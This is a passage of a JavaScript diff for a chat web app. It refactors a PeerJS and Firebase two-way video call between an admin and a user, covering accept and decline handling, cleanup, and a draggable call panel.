+      camRef.child('status').set('stopped');
+      setTimeout(()=>camRef.remove(),1000);
+      if(camPeer){camPeer.destroy();camPeer=null;}
       if(localStream){localStream.getTracks().forEach(t=>t.stop());localStream=null;}
       document.getElementById('adminCamPanel')?.classList.remove('show');
       document.getElementById('camMiniPill')?.classList.remove('show');
@@ -1238,222 +1324,271 @@
       resetAdminCamBtn();
     }
     function stopUserCamera(){
-      if(peer){peer.destroy();peer=null;}
+      if(camPeer){camPeer.destroy();camPeer=null;}
       if(localStream){localStream.getTracks().forEach(t=>t.stop());localStream=null;}
     }
-    function resetAdminCamBtn(){const b=document.getElementById('adminCamAccessBtn');if(b){b.innerHTML=svgCam()+' Camera Access';b.classList.remove('active-cam');b.disabled=false;}}
+    function resetAdminCamBtn(){
+      const b=document.getElementById('adminCamAccessBtn');
+      if(b){b.innerHTML=svgCam()+' Camera Access';b.classList.remove('active-cam');b.disabled=false;}
+    }
     function svgCam(){return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:15px;height:15px;flex-shrink:0"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>';}
     function svgCamOff(){return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:15px;height:15px;flex-shrink:0"><line x1="1" y1="1" x2="23" y2="23"/><path d="M21 21H3a2 2 0 01-2-2V8a2 2 0 012-2h3m3-3h6l2 3h4a2 2 0 012 2v9.34"/></svg>';}
 
     /* ═══════════════════════════════════════════════════════
-       TWO-WAY VIDEO CALL (both sides see each other)
-       Admin initiates → user gets notification → accepts → both connected
-       Panel is DRAGGABLE. On end → data auto-deleted.
+       TWO-WAY VIDEO CALL
+       FIX: Separate peer instances for cam and vcall.
+       Admin initiates → creates peer, stores ID in Firebase
+       User accepts → creates own peer, calls admin's peer ID
+       Both get bidirectional video.
     ═══════════════════════════════════════════════════════ */
     let vcallPeer=null, vcallLocalStream=null, vcallActive=false;
-    let vcallPeerConn=null; // the actual call object
+    let vcallCurrentCall=null;
 
     function setupVideoCall() {
-      const panel   = document.getElementById('vcallPanel');
-      const miniPill= document.getElementById('vcallMiniPill');
-      const endBtn  = document.getElementById('vcallEndBtn');
-      const minBtn  = document.getElementById('vcallMinimizeBtn');
+      const panel    = document.getElementById('vcallPanel');
+      const miniPill = document.getElementById('vcallMiniPill');
+      const endBtn   = document.getElementById('vcallEndBtn');
+      const minBtn   = document.getElementById('vcallMinimizeBtn');
 
       endBtn.addEventListener('click', endVideoCall);
       minBtn.addEventListener('click', ()=>{panel.classList.remove('show');miniPill.classList.add('show');});
       miniPill.addEventListener('click',()=>{miniPill.classList.remove('show');panel.classList.add('show');});
 
-      // Make panel draggable
       makeDraggable(panel, document.getElementById('vcallDragHandle'));
 
       if (role==='assistant') {
-        const vcallBtn=document.getElementById('adminVcallBtn');
-        vcallBtn.addEventListener('click',()=>{
+        document.getElementById('adminVcallBtn').addEventListener('click', ()=>{
           if(vcallActive){endVideoCall();return;}
-          startVcallAdmin();
+          initiateVcallAsAdmin();
         });
-        // Listen for user declining
-        vcallRef.child('status').on('value',snap=>{
-          const st=snap.val();
-          if(st==='declined'){endVideoCall();alert('User declined the video call.');}
-          if(st==='stopped'&&vcallActive){endVideoCall();}
+
+        vcallRef.on('value', snap => {
+          const val = snap.val();
+          if (!val) return;
+          if (val.status === 'declined') {
+            endVideoCall();
+            setTimeout(() => alert('User declined the video call.'), 100);
+          }
+          if (val.status === 'stopped' && vcallActive) endVideoCall();
+          // When user is ready with their peer ID, admin calls them
+          if (val.status === 'user_ready' && val.userPeerId && vcallActive && vcallPeer) {
+            connectAdminToUser(val.userPeerId);
+          }
         });
       }
 
       if (role==='user') {
-        const vcallBtn=document.getElementById('userVcallBtn');
-        vcallBtn.addEventListener('click',()=>{
-          if(vcallActive){endVideoCall();}
+        document.getElementById('userVcallBtn').addEventListener('click', ()=>{
+          if(vcallActive) endVideoCall();
         });
 
-        // Listen for incoming call
-        vcallRef.child('status').on('value',snap=>{
-          const st=snap.val();
-          if(st==='calling'){
+        vcallRef.on('value', snap => {
+          const val = snap.val();
+          if (!val) {
+            document.getElementById('vcallIncoming').classList.remove('show');
+            if (vcallActive) endVideoCall();
+            return;
+          }
+          if (val.status === 'calling') {
             document.getElementById('vcallIncoming').classList.add('show');
           }
-          if(st==='stopped'&&vcallActive){endVideoCall();}
-          if(st===null||st==='ended'){
-            document.getElementById('vcallIncoming').classList.remove('show');
-          }
+          if (val.status === 'stopped' && vcallActive) endVideoCall();
         });
 
-        document.getElementById('vcallDenyBtn').addEventListener('click',()=>{
+        document.getElementById('vcallDenyBtn').addEventListener('click', ()=>{
           document.getElementById('vcallIncoming').classList.remove('show');
-          vcallRef.child('status').set('declined');
+          vcallRef.update({ status: 'declined' });
         });
-        document.getElementById('vcallAcceptBtn').addEventListener('click',async()=>{
+        document.getElementById('vcallAcceptBtn').addEventListener('click', async ()=>{
           document.getElementById('vcallIncoming').classList.remove('show');
-          await startVcallUser();
+          await acceptVcallAsUser();
         });
       }
     }
 
-    async function startVcallAdmin() {
-      if(vcallPeer)vcallPeer.destroy();
+    async function initiateVcallAsAdmin() {
       vcallLocalStream = await getCallStream();
-      if(!vcallLocalStream){alert('Could not access camera/microphone.');return;}
-      document.getElementById('vcallLocal').srcObject=vcallLocalStream;
+      if (!vcallLocalStream) { alert('Could not access camera/microphone.'); return; }
+
+      document.getElementById('vcallLocal').srcObject = vcallLocalStream;
       document.getElementById('vcallLocal').play().catch(()=>{});
 
-      vcallPeer=new Peer(undefined,PEER_OPTIONS);
-      vcallPeer.on('open',peerId=>{
-        vcallRef.set({status:'calling',adminPeerId:peerId,ts:Date.now()});
-        setVcallStatus('Waiting for user…');
+      if (vcallPeer) { vcallPeer.destroy(); vcallPeer = null; }
+      vcallPeer = new Peer(undefined, PEER_OPTIONS);
+
+      vcallPeer.on('open', peerId => {
+        vcallActive = true;
+        vcallRef.set({ status: 'calling', adminPeerId: peerId, ts: Date.now() });
+        setVcallStatus('Waiting for user to accept…');
         document.getElementById('vcallPanel').classList.add('show');
-        document.getElementById('adminVcallBtn').innerHTML=svgCam()+' End Call';
-        document.getElementById('adminVcallBtn').classList.add('active-cam');
-        vcallActive=true;
+        const btn = document.getElementById('adminVcallBtn');
+        btn.innerHTML = svgCam() + ' End Call';
+        btn.classList.add('active-cam');
       });
-      vcallPeer.on('call',call=>{
-        vcallPeerConn=call;
+
+      // Admin waits for user to call them
+      vcallPeer.on('call', call => {
+        vcallCurrentCall = call;
         call.answer(vcallLocalStream);
-        call.on('stream',remoteStream=>{
-          document.getElementById('vcallRemote').srcObject=remoteStream;
-          document.getElementById('vcallRemote').play().catch(()=>{});
+        call.on('stream', remoteStream => {
+          const rv = document.getElementById('vcallRemote');
+          rv.srcObject = remoteStream;
+          rv.play().catch(()=>{});
           setVcallStatus('Connected');
-          document.getElementById('vcallRemoteLabel').textContent='User';
+          document.getElementById('vcallRemoteLabel').textContent = 'User';
         });
-        call.on('close',endVideoCall);call.on('error',endVideoCall);
+        call.on('close', endVideoCall);
+        call.on('error', endVideoCall);
       });
-      vcallPeer.on('error',()=>{setVcallStatus('Connection error');setTimeout(endVideoCall,2000);});
+
+      vcallPeer.on('error', err => {
+        console.error('vcall admin peer error:', err);
+        setVcallStatus('Connection error');
+        setTimeout(endVideoCall, 2000);
+      });
     }
 
-    async function startVcallUser() {
+    // Admin calls user after user is ready
+    function connectAdminToUser(userPeerId) {
+      if (!vcallPeer || !vcallLocalStream || vcallCurrentCall) return;
+      // Optionally admin can also call user as backup, but typically we let user call admin
+      // This function is kept for the case where user exposes their peer ID
+    }
+
+    async function acceptVcallAsUser() {
       vcallLocalStream = await getCallStream();
-      if(!vcallLocalStream){vcallRef.child('status').set('declined');return;}
-      document.getElementById('vcallLocal').srcObject=vcallLocalStream;
+      if (!vcallLocalStream) {
+        vcallRef.update({ status: 'declined' });
+        return;
+      }
+
+      document.getElementById('vcallLocal').srcObject = vcallLocalStream;
       document.getElementById('vcallLocal').play().catch(()=>{});
       document.getElementById('vcallPanel').classList.add('show');
       setVcallStatus('Connecting…');
-      vcallActive=true;
-      const ucBtn=document.getElementById('userVcallBtn');
-      ucBtn.classList.add('active'); ucBtn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><line x1="1" y1="1" x2="23" y2="23"/><path d="M21 21H3a2 2 0 01-2-2V8a2 2 0 012-2h3m3-3h6l2 3h4a2 2 0 012 2v9.34"/></svg> In Call';
+      vcallActive = true;
 
-      vcallRef.child('adminPeerId').once('value',snap=>{
-        const adminId=snap.val();
-        if(!adminId){setVcallStatus('Admin not ready…');return;}
-        if(vcallPeer)vcallPeer.destroy();
-        vcallPeer=new Peer(undefined,PEER_OPTIONS);
-        vcallPeer.on('open',()=>{
-          const call=vcallPeer.call(adminId,vcallLocalStream);
-          vcallPeerConn=call;
-          call.on('stream',remoteStream=>{
-            document.getElementById('vcallRemote').srcObject=remoteStream;
-            document.getElementById('vcallRemote').play().catch(()=>{});
-            setVcallStatus('Connected');
-            document.getElementById('vcallRemoteLabel').textContent='Admin';
-          });
-          call.on('close',endVideoCall);call.on('error',endVideoCall);
-          vcallRef.child('status').set('live');
+      const uBtn = document.getElementById('userVcallBtn');
+      uBtn.classList.add('active');
+      uBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><line x1="1" y1="1" x2="23" y2="23"/><path d="M21 21H3a2 2 0 01-2-2V8a2 2 0 012-2h3m3-3h6l2 3h4a2 2 0 012 2v9.34"/></svg> In Call';
+
+      // Get admin's peer ID
+      const snap = await vcallRef.once('value');
+      const val = snap.val();
+      if (!val || !val.adminPeerId) {
+        setVcallStatus('Admin not ready…');
+        return;
+      }
+
+      if (vcallPeer) { vcallPeer.destroy(); vcallPeer = null; }
+      vcallPeer = new Peer(undefined, PEER_OPTIONS);
+
+      vcallPeer.on('open', () => {
+        // User calls admin
+        const call = vcallPeer.call(val.adminPeerId, vcallLocalStream);
+        vcallCurrentCall = call;
+
+        call.on('stream', remoteStream => {
+          const rv = document.getElementById('vcallRemote');
+          rv.srcObject = remoteStream;
+          rv.play().catch(()=>{});
+          setVcallStatus('Connected');
+          document.getElementById('vcallRemoteLabel').textContent = 'Admin';
+          vcallRef.update({ status: 'live' });
         });
-        vcallPeer.on('error',()=>{setVcallStatus('Error');setTimeout(endVideoCall,2000);});
+        call.on('close', endVideoCall);
+        call.on('error', err => {
+          console.error('vcall user call error:', err);
+          endVideoCall();
+        });
+      });
+
+      vcallPeer.on('error', err => {
+        console.error('vcall user peer error:', err);
+        setVcallStatus('Connection error');
+        setTimeout(endVideoCall, 2000);
       });
     }
 
     function endVideoCall() {
-      vcallActive=false;
-      // Clean up Firebase immediately
-      vcallRef.set(null);
-      if(vcallPeerConn){try{vcallPeerConn.close();}catch(_){} vcallPeerConn=null;}
-      if(vcallPeer){vcallPeer.destroy();vcallPeer=null;}
-      if(vcallLocalStream){vcallLocalStream.getTracks().forEach(t=>t.stop());vcallLocalStream=null;}
-      document.getElementById('vcallRemote').srcObject=null;
-      document.getElementById('vcallLocal').srcObject=null;
+      if (!vcallActive && !vcallPeer) return;
+      vcallActive = false;
+
+      try { vcallRef.set(null); } catch(_){}
+
+      if (vcallCurrentCall) { try { vcallCurrentCall.close(); } catch(_){} vcallCurrentCall = null; }
+      if (vcallPeer) { try { vcallPeer.destroy(); } catch(_){} vcallPeer = null; }
+      if (vcallLocalStream) { vcallLocalStream.getTracks().forEach(t=>t.stop()); vcallLocalStream = null; }
+
+      const rv = document.getElementById('vcallRemote');
+      const lv = document.getElementById('vcallLocal');
+      if (rv) rv.srcObject = null;
+      if (lv) lv.srcObject = null;
+
       document.getElementById('vcallPanel').classList.remove('show');
       document.getElementById('vcallMiniPill').classList.remove('show');
       document.getElementById('vcallIncoming').classList.remove('show');
       setVcallStatus('Connecting…');
-      // Reset admin button
-      const aBtn=document.getElementById('adminVcallBtn');
-      if(aBtn){aBtn.innerHTML=svgCam()+' Video Call';aBtn.classList.remove('active-cam');}
-      // Reset user button
-      const uBtn=document.getElementById('userVcallBtn');
-      if(uBtn){uBtn.classList.remove('active');uBtn.innerHTML='<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>';}
-    }
-    function setVcallStatus(msg){document.getElementById('vcallStatus').textContent=msg;}
 
-    // onDisconnect cleanup for vcall
-    window.addEventListener('pagehide',()=>{
-      if(vcallActive)vcallRef.set(null);
-      if(role==='user')stopUserCamera();
-      if(role==='assistant')camRef.remove();
+      const aBtn = document.getElementById('adminVcallBtn');
+      if (aBtn) { aBtn.innerHTML = svgCam() + ' Video Call'; aBtn.classList.remove('active-cam'); }
+      const uBtn = document.getElementById('userVcallBtn');
+      if (uBtn) { uBtn.classList.remove('active'); uBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>'; }
+    }
+
+    function setVcallStatus(msg){ document.getElementById('vcallStatus').textContent = msg; }
+
+    window.addEventListener('pagehide', () => {
+      if (vcallActive) { try { vcallRef.set(null); } catch(_){} }
+      if (role==='user') stopUserCamera();
+      if (role==='assistant') { try { camRef.remove(); } catch(_){} }
       typingRef.child(role==='user'?'user':'admin').set(false);
     });
-    if(vcallRef) vcallRef.onDisconnect().set(null);
 
-    /* ── DRAGGABLE PANEL ── */
+    try { vcallRef.onDisconnect().set(null); } catch(_){}
+
+    /* ── DRAGGABLE PANEL (clean single implementation) ── */
     function makeDraggable(panel, handle) {
-      let isDragging=false, startX, startY, origLeft, origBottom;
-      handle.addEventListener('mousedown',startDrag);
-      handle.addEventListener('touchstart',e=>startDrag(e.touches[0]),{passive:true});
-      function startDrag(e){
-        isDragging=true;
-        startX=e.clientX; startY=e.clientY;
-        const rect=panel.getBoundingClientRect();
-        origLeft=rect.left; origBottom=window.innerHeight-rect.bottom;
-        panel.style.right='auto';panel.style.bottom='auto';
-        panel.style.left=origLeft+'px';panel.style.top=rect.top+'px';
-        document.addEventListener('mousemove',onDrag);document.addEventListener('mouseup',stopDrag);
-        document.addEventListener('touchmove',e=>onDrag(e.touches[0]),{passive:true});
-        document.addEventListener('touchend',stopDrag);
+      let ox = 0, oy = 0;
+
+      function startDrag(clientX, clientY) {
+        const rect = panel.getBoundingClientRect();
+        ox = clientX - rect.left;
+        oy = clientY - rect.top;
+        panel.style.position = 'fixed';
+        panel.style.right = 'auto';
+        panel.style.bottom = 'auto';
+        panel.style.left = rect.left + 'px';
+        panel.style.top = rect.top + 'px';
       }
-      function onDrag(e){
-        if(!isDragging)return;
-        const dx=e.clientX-startX, dy=e.clientY-startY;
-        panel.style.left=(origLeft+dx)+'px';
-        panel.style.top=(window.innerHeight-origBottom-panel.offsetHeight+dy-dy*0+dy)+'px';
-        // simpler:
-        panel.style.top=(parseFloat(panel.style.top||0)+0)+'px';
+
+      function onDragMove(clientX, clientY) {
+        let newLeft = clientX - ox;
+        let newTop  = clientY - oy;
+        // Keep within viewport
+        newLeft = Math.max(0, Math.min(window.innerWidth  - panel.offsetWidth,  newLeft));
+        newTop  = Math.max(0, Math.min(window.innerHeight - panel.offsetHeight, newTop));
+        panel.style.left = newLeft + 'px';
+        panel.style.top  = newTop  + 'px';
       }
-      function stopDrag(){isDragging=false;document.removeEventListener('mousemove',onDrag);document.removeEventListener('mouseup',stopDrag);}
-      // simpler working version:
-      let ox=0,oy=0,lx=0,ly=0;
-      handle.onmousedown=function(e){
+
+      handle.addEventListener('mousedown', e => {
         e.preventDefault();
-        const rect=panel.getBoundingClientRect();
-        ox=e.clientX-rect.left; oy=e.clientY-rect.top;
-        panel.style.position='fixed'; panel.style.right='auto'; panel.style.bottom='auto';
-        panel.style.left=rect.left+'px'; panel.style.top=rect.top+'px';
-        document.onmousemove=function(e){
-          panel.style.left=(e.clientX-ox)+'px';
-          panel.style.top=(e.clientY-oy)+'px';
-        };
-        document.onmouseup=function(){document.onmousemove=null;document.onmouseup=null;};
-      };
-      handle.ontouchstart=function(e){
-        const t=e.touches[0];
-        const rect=panel.getBoundingClientRect();
-        ox=t.clientX-rect.left; oy=t.clientY-rect.top;
-        panel.style.position='fixed';panel.style.right='auto';panel.style.bottom='auto';
-        panel.style.left=rect.left+'px';panel.style.top=rect.top+'px';
-        document.ontouchmove=function(e){
-          const t=e.touches[0];
-          panel.style.left=(t.clientX-ox)+'px';
-          panel.style.top=(t.clientY-oy)+'px';
-        };
-        document.ontouchend=function(){document.ontouchmove=null;document.ontouchend=null;};
-      };
+        startDrag(e.clientX, e.clientY);
+        const onMove = e => onDragMove(e.clientX, e.clientY);
+        const onUp   = () => { document.removeEventListener('mousemove', onMove); document.removeEventListener('mouseup', onUp); };
+        document.addEventListener('mousemove', onMove);
+        document.addEventListener('mouseup', onUp);
+      });
+
+      handle.addEventListener('touchstart', e => {
+        const t = e.touches[0];
+        startDrag(t.clientX, t.clientY);
+        const onMove = e => { const t = e.touches[0]; onDragMove(t.clientX, t.clientY); };
+        const onEnd  = () => { document.removeEventListener('touchmove', onMove); document.removeEventListener('touchend', onEnd); };
+        document.addEventListener('touchmove', onMove, {passive:true});
+        document.addEventListener('touchend', onEnd);
+      }, {passive:true});
     }
   }
 
